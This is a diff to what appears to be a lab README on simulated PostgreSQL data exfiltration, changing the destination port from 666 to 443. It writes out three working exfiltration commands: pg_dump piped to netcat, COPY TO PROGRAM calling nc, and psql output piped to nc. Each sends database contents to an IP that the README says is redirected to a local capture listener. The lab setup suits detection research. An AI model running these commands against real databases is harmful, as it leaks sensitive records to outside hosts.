@@ -158,17 +158,17 @@ The experiments support multiple PostgreSQL exfiltration techniques:
 
 ### 1. pg_dump over netcat
 ```bash
-pg_dump -U postgres labdb | nc -w 10 137.184.126.86 666
+pg_dump -U postgres labdb | nc -w 10 137.184.126.86 443
 ```
 
 ### 2. COPY PROGRAM
 ```sql
-COPY employees TO PROGRAM 'nc -w 10 137.184.126.86 666';
+COPY employees TO PROGRAM 'nc -w 10 137.184.126.86 443';
 ```
 
 ### 3. Manual query + netcat
 ```bash
-psql -U postgres -c "SELECT * FROM employees;" | nc 137.184.126.86 666
+psql -U postgres -c "SELECT * FROM employees;" | nc 137.184.126.86 443
 ```
 
 All methods route through the fake public IP (`137.184.126.86`) which is DNAT'd to the router for capture.
@@ -190,13 +190,13 @@ All methods route through the fake public IP (`137.184.126.86`) which is DNAT'd 
         │                            │
         │ Exfil to fake IP           │ nc listener
         ▼                            ▼
-   137.184.126.86:666        /tmp/exfil/labdb_dump.sql
+   137.184.126.86:443        /tmp/exfil/labdb_dump.sql
    (simulated external)       (captured data)
 ```
 
 ### Traffic Flow
 
-1. **Server** executes exfiltration command targeting `137.184.126.86:666`
+1. **Server** executes exfiltration command targeting `137.184.126.86:443`
 2. **Router** receives traffic via static route
 3. **DNAT** redirects fake IP to local netcat listener
 4. **Router** captures data to `/tmp/exfil/labdb_dump.sql`
